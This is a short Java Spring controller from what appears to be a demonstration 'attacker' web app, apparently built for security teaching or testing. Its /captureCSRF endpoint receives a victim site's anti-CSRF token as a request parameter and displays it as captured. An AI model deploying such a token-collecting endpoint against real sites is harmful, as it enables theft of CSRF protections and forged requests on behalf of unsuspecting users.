package com.attacker.attackerwebapp.api;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class CrossDomainDataCaptureController {

    @GetMapping("/captureCSRF")
    public String captureDataCrossDomain(@RequestParam String _csrf, Model model){
        model.addAttribute("captured", _csrf);
        return "capturedCSRF";
    }
}
